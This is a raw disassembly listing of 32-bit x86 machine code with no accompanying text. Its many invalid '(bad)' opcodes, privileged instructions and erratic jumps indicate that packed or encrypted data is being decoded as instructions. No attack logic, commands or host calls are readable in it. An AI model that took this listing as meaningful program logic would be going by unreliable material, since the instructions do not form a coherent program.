  426a35:	hlt    
  426a36:	add    al,0xb1
  426a38:	js     0x426a5d
  426a3a:	or     eax,0x67f14b2f
  426a3f:	cli    
  426a40:	(bad)  
  426a41:	retf   0xfef5
  426a44:	stos   BYTE PTR es:[edi],al
  426a45:	lea    esp,[ecx]
  426a47:	adc    eax,0x34cbac50
  426a4c:	add    ebx,DWORD PTR [esi+0x7]
  426a4f:	jle    0x426a73
  426a51:	call   0x6384064a
  426a56:	mov    ds:0x72994e99,al
  426a5b:	repz jno 0x426abb
  426a5e:	shl    BYTE PTR ds:0xf940c369,cl
  426a64:	xlat   BYTE PTR ds:[ebx]
  426a65:	inc    eax
  426a66:	stos   BYTE PTR es:[edi],al
  426a67:	adc    edi,DWORD PTR [ecx]
  426a69:	dec    ecx
  426a6a:	(bad)  
  426a6d:	xchg   DWORD PTR [edi],edi
  426a6f:	(bad)  
  426a71:	xor    ebx,DWORD PTR [esi+0x5b6d1b77]
  426a77:	push   esi
  426a78:	test   DWORD PTR [eax-0x6],ebp
  426a7b:	bnd jmp 0x426a02
  426a7e:	pcmpeqb mm5,mm4
  426a81:	adc    DWORD PTR [ecx+0x1b056152],eax
  426a87:	adc    BYTE PTR [ebp+0x34658fd8],ch
  426a8d:	cmp    DWORD PTR [edx+edx*4-0x1bcfe24b],esp
  426a94:	mov    eax,ds:0x326c8bd0
  426a99:	jle    0x426b0d
  426a9b:	ds js  0x426af4
  426a9e:	or     di,bp
  426aa1:	lock icebp 
  426aa3:	adc    eax,0x457c9c7f
  426aa8:	bnd jbe 0x426a54
  426aab:	ret    0xa291
  426aae:	daa    
  426aaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ab0:	jo     0x426aa3
  426ab2:	stc    
  426ab3:	shr    DWORD PTR [esi-0x5602b716],cl
  426ab9:	and    esi,ebx
  426abb:	jmp    0x51da:0xb00ff74b
  426ac2:	cmp    al,0x10
  426ac4:	fst    DWORD PTR [esi+0x5871e0c]
  426aca:	jmp    0x426ab9
  426acc:	dec    ebp
  426acd:	pop    ecx
  426ace:	ins    BYTE PTR es:[edi],dx
  426acf:	sahf   
  426ad0:	test   BYTE PTR [ebx-0x1d],0x6d
  426ad4:	jbe    0x426b33
  426ad6:	das    
  426ad7:	cwde   
  426ad8:	repnz aaa 
  426ada:	push   esp
  426adb:	clc    
  426adc:	inc    esi
  426add:	add    esp,esi
  426adf:	push   ebp
  426ae0:	test   DWORD PTR [ebp-0x7868f805],eax
  426ae6:	(bad)  
  426ae7:	mov    esp,0x46ea985b
  426aec:	lds    ebp,FWORD PTR [ecx+0x0]
	...
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x29
  426b63:	mov    fs,WORD PTR [edi+0x19f679f]
  426b69:	add    BYTE PTR [eax],al
  426b6b:	add    DWORD PTR [eax],eax
  426b6d:	add    cl,ah
  426b6f:	out    dx,al
  426b70:	add    al,0xa
  426b72:	and    edx,DWORD PTR [esi+0x79]
  426b75:	sub    eax,0x8a7c4015
  426b7a:	cld    
  426b7b:	hlt    
  426b7c:	and    eax,0xe4250eb6
  426b81:	jns    0x426b31
  426b83:	sbb    BYTE PTR [ecx+eax*4-0x57260d1c],ch
  426b8a:	sub    bl,BYTE PTR [edx+0x73ef0a3a]
  426b90:	cwde   
  426b91:	xor    edi,0xffffffa9
  426b94:	add    DWORD PTR [ecx+ebx*4-0x52d47757],esi
  426b9b:	cmp    bh,al
  426b9d:	sbb    ecx,ebp
  426b9f:	sar    BYTE PTR ds:0x39d31519,1
  426ba5:	push   0xa09a25fc
  426baa:	pop    ebx
  426bab:	xor    al,0x7a
  426bad:	fimul  WORD PTR [ebp-0x56]
  426bb0:	inc    ebp
  426bb1:	repz fidivr WORD PTR [edx+0x7a6e0c7]
  426bb8:	sub    ebp,DWORD PTR [eax+0x15]
  426bbb:	in     eax,0xce
  426bbd:	test   al,0x3e
  426bbf:	pop    esi
  426bc0:	(bad)  
  426bc2:	push   ebp
  426bc3:	arpl   si,cx
  426bc5:	jle    0x426b5f
  426bc7:	call   0x4db9:0xa47aeebe
  426bce:	retf   0xd330
  426bd1:	pop    eax
  426bd2:	mul    DWORD PTR [ebp+0xe1ced7f]
  426bd8:	or     BYTE PTR [edx-0x21262c57],dh
  426bde:	sbb    ebx,DWORD PTR [esi]
  426be0:	test   al,0x88
  426be2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426be3:	loop   0x426c1a
  426be5:	bound  esi,QWORD PTR [esi]
  426be7:	test   DWORD PTR [edi],ebp
  426be9:	out    0x24,al
  426beb:	xor    BYTE PTR [esi+0x13],dh
  426bee:	push   edi
  426bef:	xchg   esp,eax
  426bf0:	mov    al,0xce
  426bf2:	fnstenv [ecx]
  426bf4:	std    
  426bf5:	rol    BYTE PTR [eax+0x550d441],0xef
  426bfc:	push   edx
  426bfd:	jne    0x426bb5
  426bff:	std    
  426c00:	cmp    al,0xee
  426c02:	xor    dh,cl
  426c04:	daa    
  426c05:	xchg   DWORD PTR ds:0xb75be047,edx
  426c0b:	jp     0x426b9a
  426c0d:	jne    0x426c4f
  426c0f:	fiadd  DWORD PTR [ebp-0x7d]
  426c12:	mov    esp,0x3542d150
  426c17:	mov    esi,0xcf384970
  426c1c:	push   0x8b963635
  426c21:	ret    
  426c22:	imul   ebp,esp,0x1e
  426c25:	jg     0x426c43
  426c27:	sbb    edi,DWORD PTR [edx-0x2e]
  426c2a:	aam    0xb0
  426c2c:	xor    edx,DWORD PTR ds:0x5ef29984
  426c32:	xor    bl,BYTE PTR [ebp+eax*1+0x1832641b]
  426c39:	add    DWORD PTR [eax+0x6d],ebx
  426c3c:	add    edi,ecx
  426c3e:	mov    dl,0x54
  426c40:	jle    0x426c2b
  426c42:	arpl   WORD PTR [esi-0x12],bp
  426c45:	push   ebp
  426c46:	push   ebx
  426c47:	aas    
  426c48:	int3   
  426c49:	mov    WORD PTR [ecx+0x164ee114],ds
  426c4f:	mov    ah,0xea
  426c51:	jl     0x426bfc
  426c53:	sub    esp,ecx
  426c55:	cdq    
  426c56:	rol    BYTE PTR [esi+0x66],1
  426c59:	adc    eax,DWORD PTR [ecx]
  426c5b:	sbb    al,0x9c
  426c5d:	inc    eax
  426c5e:	dec    edi
  426c5f:	sub    ebx,ebx
  426c61:	mov    ch,0x45
  426c63:	sub    eax,0xff647c1f
  426c68:	mov    esp,0x38948da9
  426c6d:	xor    eax,DWORD PTR [eax]
	...
  426cd3:	add    BYTE PTR [eax],al
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0x730b9c6e
  426ce6:	addr16 mov al,ds:0x1
  426cea:	add    BYTE PTR [ecx],al
  426cec:	add    BYTE PTR [eax],al
  426cee:	pop    edi
  426cef:	pop    ds
  426cf0:	hlt    
  426cf1:	ins    BYTE PTR es:[edi],dx
  426cf2:	(bad)  
  426cf4:	mov    dl,0xa4
  426cf6:	dec    eax
  426cf7:	pop    dx
  426cf9:	(bad)  
  426cfa:	popa   
  426cfb:	adc    edx,ebp
  426cfd:	xchg   ebp,eax
  426cfe:	pop    ss
  426cff:	fdivr  st(1),st
  426d01:	call   0x568:0x7cb267aa
  426d08:	mov    eax,ds:0x1b76f398
  426d0d:	int3   
  426d0e:	mov    ah,0x92
  426d10:	xlat   BYTE PTR ds:[ebx]
  426d11:	jae    0x426d09
  426d13:	pop    esi
  426d14:	lods   al,BYTE PTR ds:[esi]
  426d15:	xor    eax,0x66b4e4bf
  426d1a:	push   0x1ef9828b
  426d1f:	hlt    
  426d20:	jge    0x426cfc
  426d22:	add    eax,0x7527da1a
  426d27:	mov    ch,0xce
  426d29:	xor    ebp,ebp
  426d2b:	and    DWORD PTR [eax],esp
  426d2d:	and    al,0x9e
  426d2f:	inc    esp
  426d30:	in     eax,dx
  426d31:	mov    ds:0xc60dcfc8,eax
  426d36:	cdq    
  426d37:	cmp    edi,esp
  426d39:	jmp    0xc2aa9de5
  426d3e:	lea    ebx,[ebx]
  426d40:	(bad)  
  426d41:	lods   eax,DWORD PTR ds:[esi]
  426d42:	test   al,0x7
  426d44:	and    DWORD PTR [edx],esp
  426d46:	sub    esi,DWORD PTR [ebp+0x35]
  426d49:	push   cs
  426d4a:	inc    edi
  426d4c:	sub    ebx,ebx
  426d4e:	xchg   edi,eax
  426d4f:	stos   DWORD PTR es:[edi],eax
  426d50:	dec    ebp
  426d51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d52:	loop   0x426d30
  426d54:	icebp  
  426d55:	outs   dx,DWORD PTR ds:[esi]
  426d56:	add    edi,edi
  426d58:	inc    edi
  426d59:	sar    ch,cl
  426d5b:	mov    WORD PTR [edi-0x1dd0f192],ss
  426d61:	stos   DWORD PTR es:[edi],eax
  426d62:	stc    
  426d63:	fwait
  426d64:	test   DWORD PTR [eax+0x5e34ec9c],esp
  426d6a:	or     ecx,DWORD PTR [edx]
  426d6c:	cmc    
  426d6d:	outs   dx,BYTE PTR ds:[esi]
  426d6e:	cmp    esi,DWORD PTR [edi-0x54a6d6a]
  426d74:	jecxz  0x426d47
  426d76:	push   0x1d602bd
  426d7b:	fs cmove edi,esi
  426d7f:	pop    ss
  426d80:	xchg   esi,eax
  426d81:	jmp    0x426dd7
  426d83:	sar    DWORD PTR [ebx],0xe0
  426d86:	(bad)  
  426d88:	mov    ds:0x2317e905,al
  426d8d:	push   eax
  426d8e:	ins    DWORD PTR es:[edi],dx
  426d8f:	fidiv  DWORD PTR [eax]
  426d91:	cld    
  426d92:	pop    eax
  426d93:	cmp    bl,bl
  426d95:	call   0x5e73:0xeb1ccea0
  426d9c:	mov    esp,0x359e573
  426da1:	rcl    BYTE PTR [ecx+0x6f718c6c],0x7
  426da8:	nop
  426da9:	in     eax,dx
  426daa:	push   ecx
  426dab:	or     esi,ecx
  426dad:	xor    al,0xcd
  426daf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426db0:	or     al,0x3
  426db2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426db3:	xor    eax,0x5746161c
  426db8:	imul   esp,DWORD PTR [ecx-0x3cd7cac],0x5d5ba07c
  426dc2:	push   es
  426dc3:	stos   BYTE PTR es:[edi],al
  426dc4:	mov    bl,0x62
  426dc6:	xchg   esi,eax
  426dc7:	jnp    0x426d92
  426dc9:	mov    bl,0xb7
  426dcb:	dec    eax
  426dcc:	or     eax,0x768ddea6
  426dd1:	imul   edx,edi,0x6238edd0
  426dd7:	int    0xbc
  426dd9:	pop    edi
  426dda:	je     0x426dc2
  426ddc:	daa    
  426ddd:	mov    BYTE PTR [ebx+0x75],dl
  426de0:	out    dx,al
  426de1:	and    ebp,DWORD PTR es:[edx+0x7c]
  426de5:	and    ch,al
  426de7:	jnp    0x426e61
  426de9:	dec    eax
  426dea:	push   esi
  426deb:	pop    ebx
  426dec:	cs add BYTE PTR ss:[eax],al
	...
  426e54:	add    BYTE PTR [eax],al
  426e56:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426e5c:	call   0x920c:0xc7c2ecf9
  426e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e64:	jle    0x426e18
  426e66:	addr16 mov eax,ds:0x1
  426e6a:	add    BYTE PTR [ecx],al
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	in     al,dx
  426e6f:	and    al,0xbb
  426e71:	mov    DWORD PTR [ecx+ebx*8+0x3db0d1e7],eax
  426e78:	out    dx,eax
  426e79:	and    edi,DWORD PTR [ebp+0x42e931a5]
  426e7f:	push   esp
  426e80:	nop
  426e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e82:	nop
  426e83:	pop    esp
  426e84:	push   ebx
  426e85:	test   dl,ah
  426e87:	hlt    
  426e88:	out    0x34,eax
  426e8a:	sbb    al,BYTE PTR [ebp-0x7e48d816]
  426e90:	fdivp  st(6),st
  426e92:	jae    0x426e3f
  426e94:	add    ah,ah
  426e96:	(bad)  
  426e97:	sbb    BYTE PTR [esi+0x7c],dl
  426e9a:	mov    ebx,gs
  426e9c:	xor    eax,0x11f136f6
  426ea1:	pushf  
  426ea2:	push   ds
  426ea3:	iret   
  426ea4:	mov    ebx,0x49e1e102
  426ea9:	mov    bl,0x79
  426eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426eac:	jl     0x426ec9
  426eae:	subps  xmm5,xmm0
  426eb1:	adc    ah,BYTE PTR [ebx+0x76]
  426eb4:	jg     0x426e9e
  426eb6:	push   ss
  426eb7:	pop    esp
  426eb8:	or     al,0x60
  426eba:	xchg   edx,eax
  426ebb:	mov    bl,0xef
  426ebd:	inc    esi
  426ebe:	adc    DWORD PTR [eax-0x22],ecx
  426ec1:	mov    dh,0x7d
  426ec3:	sub    DWORD PTR [esi-0x7],esi
  426ec6:	push   ds
  426ec7:	mov    ch,0xdc
  426ec9:	dec    edi
  426eca:	push   ds
  426ecb:	push   esi
  426ecc:	mov    eax,ds:0x42a81bb7
  426ed1:	push   es
  426ed2:	jo     0x426f41
  426ed4:	sti    
  426ed5:	clc    
  426ed6:	pop    ecx
  426ed7:	dec    ebx
  426ed8:	adc    ch,BYTE PTR [edi-0x5f]
  426edb:	stc    
  426edc:	push   0xec6edff
  426ee1:	jg     0x426f07
  426ee3:	addr16 popa 
  426ee5:	cdq    
  426ee6:	in     eax,0x12
  426ee8:	jp     0x426f23
  426eea:	dec    eax
  426eeb:	in     eax,0xbf
  426eed:	mov    dl,0xe4
  426eef:	pop    edi
  426ef0:	sub    bl,BYTE PTR [ebx+0x74]
  426ef3:	inc    ebp
  426ef4:	mov    ch,0x2a
  426ef6:	or     edi,DWORD PTR [eax-0x12b07aa]
  426efc:	sti    
  426efd:	add    al,0x1b
  426eff:	inc    BYTE PTR [edx+0x57]
  426f02:	pop    esi
  426f03:	sbb    DWORD PTR [ebx],0xc220376b
  426f09:	inc    edx
  426f0a:	mov    esp,0x9b11b8a2
  426f0f:	push   0xffffffcc
  426f11:	xchg   ecx,eax
  426f12:	xor    eax,0x9ad2f539
  426f17:	xchg   ebx,eax
  426f18:	not    BYTE PTR [eax+0x13c2f421]
  426f1e:	xor    al,0x48
  426f20:	or     dl,bh
  426f22:	(bad)  
  426f24:	mov    al,ds:0xe91b31bf
  426f29:	jns    0x426ebd
  426f2b:	inc    ecx
  426f2c:	loopne 0x426f3b
  426f2e:	lock in eax,0x26
  426f31:	sbb    dl,0x4
  426f34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f35:	imul   ebx,DWORD PTR [esi-0x14],0x44
  426f39:	fdivp  st(4),st
  426f3b:	cs std 
  426f3d:	dec    eax
  426f3e:	mov    dh,0xbc
  426f40:	scas   eax,DWORD PTR es:[edi]
  426f41:	add    BYTE PTR [edx-0x3f234ca0],bl
  426f47:	call   0x1998490d
  426f4c:	pop    ss
  426f4d:	pop    ebx
  426f4e:	xchg   ebx,eax
  426f4f:	fcomp  QWORD PTR [eax-0x39]
  426f52:	outs   dx,DWORD PTR ds:[esi]
  426f53:	loopne 0x426f90
  426f55:	retf   
  426f56:	xor    dh,BYTE PTR [ecx+0x0]
  426f59:	ins    DWORD PTR es:[edi],dx
  426f5a:	ins    DWORD PTR es:[edi],dx
  426f5b:	fs inc esi
  426f5d:	in     al,0xc
  426f5f:	test   esp,esp
  426f61:	pop    eax
  426f62:	test   eax,0xe6fab1ac
  426f67:	dec    ebx
  426f68:	in     al,0xfc
  426f6a:	and    BYTE PTR [edx+0x5e],bl
  426f6d:	add    al,0x0
	...
  426fd3:	add    BYTE PTR [eax],al
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [edx+ebp*1+0x67ea6893],esp
  426fe7:	mov    ds:0x1000001,al
  426fec:	add    BYTE PTR [eax],al
  426fee:	jb     0x42701f
  426ff0:	adc    eax,0x4edc9a5c
  426ff5:	push   ss
  426ff6:	inc    ecx
  426ff7:	(bad)  
  426ff8:	stos   BYTE PTR es:[edi],al
  426ff9:	cwde   
  426ffa:	lock stos BYTE PTR es:[edi],al
  426ffc:	fst    QWORD PTR [eax]
  426ffe:	hlt    
  426fff:	std    
  427000:	inc    eax
  427001:	adc    ah,BYTE PTR [eax]
  427003:	fist   WORD PTR [edi-0x28d990a3]
  427009:	xor    eax,0x9b79cf19
  42700e:	test   eax,0xc4104619
  427013:	iret   
  427014:	pop    eax
  427015:	add    dh,dh
  427017:	clc    
  427018:	leave  
  427019:	cmp    edi,ebp
  42701b:	fld    st(2)
  42701d:	dec    esp
  42701e:	inc    ebx
  42701f:	or     BYTE PTR [edx-0x45],bl
  427022:	xchg   ebp,eax
  427023:	fst    DWORD PTR ds:0x32eca28a
  427029:	sbb    BYTE PTR [ecx],ah
  42702b:	(bad)  
  42702c:	loopne 0x427085
  42702e:	daa    
  42702f:	jle    0x427058
  427031:	into   
  427032:	adc    al,0x9c
  427034:	xor    ebp,DWORD PTR [edi-0x5e]
  427037:	fst    st(1)
  427039:	jns    0x4270b9
  42703b:	rol    DWORD PTR [ebx],0x1
  42703e:	dec    edi
  42703f:	add    eax,0xc1265168
  427044:	xchg   esp,eax
  427045:	dec    edx
  427046:	out    0x2,eax
  427048:	aas    
  427049:	sub    eax,eax
  42704b:	lahf   
  42704c:	xor    eax,0xbe49f836
  427051:	stos   BYTE PTR es:[edi],al
  427052:	cwde   
  427053:	lea    ebx,[edx]
  427055:	push   ds
  427056:	mov    ds:0xfdc6bc40,al
  42705b:	es push ss
  42705d:	xor    DWORD PTR [esi],0x786a5f8d
  427063:	xchg   esi,eax
  427064:	adc    eax,edi
  427066:	or     eax,0xcc15b08e
  42706b:	xchg   ebp,eax
  42706c:	(bad)  
  42706d:	stos   BYTE PTR es:[edi],al
  42706e:	ror    bh,0x60
  427071:	mov    ebp,0xa8eedde
  427076:	std    
  427077:	jmp    0x4270e2
  427079:	xchg   edx,eax
  42707a:	aad    0x13
  42707c:	lahf   
  42707d:	pop    esi
  42707e:	or     dl,BYTE PTR [ebx-0x1b25a50d]
  427084:	pop    ss
  427085:	pop    edi
  427086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427087:	stc    
  427088:	popa   
  427089:	mov    al,ds:0x2433971b
  42708e:	sbb    eax,0xef3972d0
  427093:	sub    BYTE PTR [ebp-0x7a6eb43f],al
  427099:	gs scas al,BYTE PTR es:[edi]
  42709b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42709c:	jmp    0x662b:0x52e1386a
  4270a3:	mov    eax,ds:0x94ce23c8
  4270a8:	mov    eax,0xf1c169a2
  4270ad:	mov    ecx,DWORD PTR [ecx]
  4270af:	pop    es
  4270b0:	aaa    
  4270b1:	sub    al,0xea
  4270b3:	xchg   ecx,eax
  4270b4:	cmp    DWORD PTR [esi],ebx
  4270b6:	nop
  4270b7:	call   0xf49c2f59
  4270bc:	inc    BYTE PTR [ebx+edx*4+0x5]
  4270c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4270c1:	lea    edi,[ebx]
  4270c3:	mov    ds:0x291e4d17,eax
  4270c8:	mov    bl,0x2d
  4270ca:	(bad)  
  4270cb:	xor    ebx,esp
  4270cd:	(bad)
  4270d0:	cwde   
  4270d1:	mov    ?,WORD PTR [ebp+0x7e]
  4270d4:	and    BYTE PTR [eax],bl
  4270d6:	test   eax,0x762bdfc6
  4270db:	xlat   BYTE PTR ds:[ebx]
  4270dc:	or     edx,DWORD PTR fs:[ecx+0x2e]
  4270e0:	jecxz  0x42708e
  4270e2:	inc    edx
  4270e3:	pushf  
  4270e4:	in     al,dx
  4270e5:	nop
  4270e6:	inc    ebp
  4270e7:	ja     0x427129
  4270e9:	and    edx,edx
  4270eb:	je     0x4270ad
  4270ed:	dec    eax
	...
  427156:	or     al,0x6d
  427158:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42715e:	inc    esp
  42715f:	mov    ebp,0x44d99d96
  427164:	xchg   ebx,eax
  427165:	scas   eax,DWORD PTR es:[edi]
  427166:	addr16 mov ds:0x1,eax
  42716a:	add    BYTE PTR [ecx],al
  42716c:	add    BYTE PTR [eax],al
  42716e:	icebp  
  42716f:	xor    DWORD PTR [ecx-0x12],ecx
  427172:	popa   
  427173:	imul   esi,DWORD PTR [esi-0x6a],0xfd612292
  42717a:	and    BYTE PTR ds:0xdc71b565,ah
  427180:	mov    ecx,0xc0eeca20
  427185:	fidiv  WORD PTR [eax]
  427187:	stc    
  427188:	jmp    0x427182
  42718a:	jae    0x42715d
  42718c:	ret    
  42718d:	dec    ecx
  42718e:	test   al,0x89
  427190:	xor    eax,0x94d42d04
  427195:	and    edi,DWORD PTR [edi+edx*4]
  427198:	aad    0xce
  42719a:	inc    ecx
  42719b:	sbb    eax,0x4c4a03f0
  4271a0:	out    dx,eax
  4271a1:	jecxz  0x427168
  4271a3:	push   ecx
  4271a4:	xlat   BYTE PTR ds:[ebx]
  4271a5:	jle    0x42720f
  4271a7:	clc    
  4271a8:	mov    edx,0xcdbf8ef5
  4271ad:	jl     0x4271be
  4271af:	jl     0x4271d0
  4271b1:	lea    ebp,[ebp-0x6a]
  4271b4:	inc    edx
  4271b5:	fisub  WORD PTR [eax-0x7f]
  4271b8:	and    DWORD PTR [esi],ebp
  4271ba:	sub    BYTE PTR [ebx-0x3b],dh
  4271bd:	xlat   BYTE PTR ds:[ebx]
  4271be:	sbb    cl,ah
  4271c0:	pusha  
  4271c1:	or     DWORD PTR [edx-0x42],0xffffffd8
  4271c5:	adc    DWORD PTR [ebx],edi
  4271c7:	pusha  
  4271c8:	jno    0x4271a8
  4271ca:	or     BYTE PTR [esi-0x73913b78],dl
  4271d0:	jb     0x4271b5
  4271d2:	fisttp DWORD PTR [ebp+0x2e9103b6]
  4271d8:	retf   
  4271d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271da:	sub    al,0x7a
  4271dc:	inc    DWORD PTR [ebp-0x61eb182d]
  4271e2:	ss daa 
  4271e4:	push   ebp
  4271e5:	jle    0x427174
  4271e7:	and    dl,BYTE PTR [edx-0x794c5d6d]
  4271ed:	fist   DWORD PTR [esi+0x66]
  4271f0:	mov    cl,0xf3
  4271f2:	aad    0xc7
  4271f4:	iret   
  4271f5:	fnstenv [edx-0x1a]
  4271f8:	mov    ds:0x8a9cbda6,eax
  4271fd:	and    al,0xa1
  4271ff:	mov    al,0x6a
  427201:	inc    ebp
  427202:	push   ebx
  427203:	mov    edx,0x8cbd63b8
  427208:	sbb    eax,ebx
  42720a:	and    esp,DWORD PTR [ecx-0x71]
  42720d:	add    ecx,DWORD PTR [ebp-0x66]
  427210:	hlt    
  427211:	add    al,0xe4
  427213:	jmp    FWORD PTR [edi]
  427215:	test   al,0x81
  427217:	push   eax
  427218:	loop   0x4271c8
  42721a:	out    0xce,al
  42721c:	aad    0x1c
  42721e:	bnd jmp 0x59bde312
  427224:	cmp    DWORD PTR [ebp+0x13],ebp
  427227:	imul   esp,esi,0x42e06682
  42722d:	pop    ebx
  42722e:	add    eax,0xde63a459
  427233:	push   ebp
  427234:	repnz lods eax,DWORD PTR ds:[esi]
  427236:	jb     0x427285
  427238:	nop
  427239:	fwait
  42723a:	ja     0x427240
  42723c:	stos   DWORD PTR es:[edi],eax
  42723d:	in     eax,dx
  42723e:	sub    al,0xb8
  427240:	fwait
  427241:	sbb    edx,DWORD PTR [edx]
  427243:	addps  xmm4,XMMWORD PTR [edx]
  427246:	add    al,0x4f
  427248:	(bad)  
  427249:	inc    DWORD PTR [ecx]
  42724b:	ret    0x4601
  42724e:	jnp    0x427296
  427250:	jge    0x4272a2
  427252:	xchg   esp,eax
  427253:	cmp    edx,DWORD PTR [edx+0x19651b9a]
  427259:	cmp    BYTE PTR [edi-0x18db9fe5],al
  42725f:	or     BYTE PTR [eax+esi*2+0x585c9a65],0xf
  427267:	ret    0x4fb
  42726a:	mov    eax,cr0
  42726d:	fadd   QWORD PTR [eax]
	...
  4272d3:	add    BYTE PTR [eax],al
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0x8ea5679d,al
  4272e6:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4272e8:	add    DWORD PTR [eax],eax
  4272ea:	add    BYTE PTR [ecx],al
  4272ec:	add    BYTE PTR [eax],al
  4272ee:	popa   
  4272ef:	pop    es
  4272f0:	ins    BYTE PTR es:[edi],dx
  4272f1:	out    dx,eax
  4272f2:	mov    dl,0x6e
  4272f4:	mov    ds:0x8f81189d,al
  4272f9:	cmp    BYTE PTR [eax+0x5ed4682b],cl
  4272ff:	lods   al,BYTE PTR ds:[esi]
  427300:	ss mov edi,0x944654d8
  427306:	dec    ecx
  427307:	iret   
  427308:	cwde   
  427309:	shr    BYTE PTR [eax-0x2ea4b16],cl
  42730f:	hlt    
  427310:	sbb    ebp,ecx
  427312:	xchg   esi,eax
  427313:	or     eax,0x55399fe3
  427318:	(bad)  
  427319:	in     eax,dx
  42731a:	int    0xf4
  42731c:	sub    eax,0x8079f86e
  427321:	mov    ds:0xc71e2048,al
  427326:	sahf   
  427327:	push   ebp
  427328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427329:	in     eax,0xdd
  42732b:	cmp    eax,0x6df917e0
  427330:	xchg   DWORD PTR gs:[esp+ebx*4+0x5b],ebp
  427335:	cs xchg esp,eax
  427337:	pmaxub mm2,mm2
  42733a:	scas   eax,DWORD PTR es:[edi]
  42733b:	sub    DWORD PTR [ebx-0x32ad1d7a],0xc8200a93
  427345:	jb     0x427342
  427347:	leave  
  427348:	ins    BYTE PTR es:[edi],dx
  427349:	pop    eax
  42734a:	jge    0x4273b8
  42734c:	cmc    
  42734d:	clc    
  42734e:	rcl    BYTE PTR [esi-0x2c],0xc9
  427352:	pop    ds
  427353:	mov    ebp,0x42c17fed
  427358:	pop    esp
  427359:	aad    0x60
  42735b:	mov    BYTE PTR [ebp-0x4e7d2f3a],ch
  427361:	imul   eax,DWORD PTR [eax-0x53ceac98],0x2b
  427368:	cmp    BYTE PTR [ebx],cl
  42736a:	cwde   
  42736b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42736c:	ficomp WORD PTR [edx]
  42736e:	arpl   WORD PTR [eax+0x41908878],si
  427374:	xor    al,0x17
  427376:	sbb    BYTE PTR [edx+0x35a3807f],ch
  42737c:	jl     0x4273f7
  42737e:	jnp    0x427347
  427380:	jb     0x4273f2
  427382:	daa    
  427383:	and    DWORD PTR [ecx+0x795c4f2b],0x2a7c234d
  42738d:	sbb    bl,dl
  42738f:	fcmove st,st(3)
  427391:	retf   0x83f7
  427394:	lahf   
  427395:	jb     0x42737e
  427397:	mov    ds:0xd43c3a45,eax
  42739c:	inc    edi
  42739d:	lods   eax,DWORD PTR ds:[esi]
  42739e:	cmp    al,0xef
  4273a0:	or     bh,BYTE PTR [esi-0x445c30a2]
  4273a6:	mov    esi,0xb44a4ae9
  4273ab:	push   edx
  4273ac:	mov    cl,0xae
  4273ae:	aas    
  4273af:	ds mov bl,0x2c
  4273b2:	lds    esi,FWORD PTR [esp+esi*8]
  4273b5:	es (bad) 
  4273b8:	sub    esi,ebx
  4273ba:	or     al,0x5e
  4273bc:	dec    edx
  4273bd:	sar    BYTE PTR [edx],1
  4273bf:	sub    ah,al
  4273c1:	dec    ecx
  4273c2:	test   DWORD PTR ds:0x82c91f4f,edx
  4273c8:	push   cs
  4273c9:	mov    eax,0x44f866da
  4273ce:	or     DWORD PTR [ecx*1-0xfe13007],ecx
  4273d5:	xor    DWORD PTR [ecx],ecx
  4273d7:	mov    al,0xf7
  4273d9:	dec    ecx
  4273da:	hlt    
  4273db:	jecxz  0x4273da
  4273dd:	sbb    DWORD PTR [edx+0x14485df1],ebx
  4273e3:	mov    ds:0x910ab09d,eax
  4273e8:	jns    0x427429
  4273ea:	fisubr DWORD PTR [edi-0x7d]
  4273ed:	jbe    0x4273ef
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    edi,DWORD PTR ds:0x67dd0ef1
  427467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427468:	add    DWORD PTR [eax],eax
  42746a:	add    BYTE PTR [ecx],al
  42746c:	add    BYTE PTR [eax],al
  42746e:	pushf  
  42746f:	mov    ebx,0xf57c18c5
  427474:	cmp    eax,0x3541fe05
  427479:	call   DWORD PTR [edx+0xf0df661]
  42747f:	push   esp
  427480:	(bad)  
  427481:	jle    0x427440
  427483:	or     al,0xb4
  427485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427486:	ret    
  427487:	adc    bh,0x90
  42748a:	or     eax,0x264857ca
  42748f:	outs   dx,BYTE PTR ds:[esi]
  427490:	push   esi
  427491:	xor    al,0xcf
  427493:	sbb    al,0xf3
  427495:	mov    esp,0xcafaff5c
  42749a:	mov    ebp,0xc98090eb
  42749f:	(bad)  
  4274a2:	pop    ss
  4274a3:	fsub   DWORD PTR [ebx]
  4274a5:	mov    esp,0x6a27a8a1
  4274aa:	jns    0x42750c
  4274ac:	test   ebp,ebx
  4274ae:	jg     0x427513
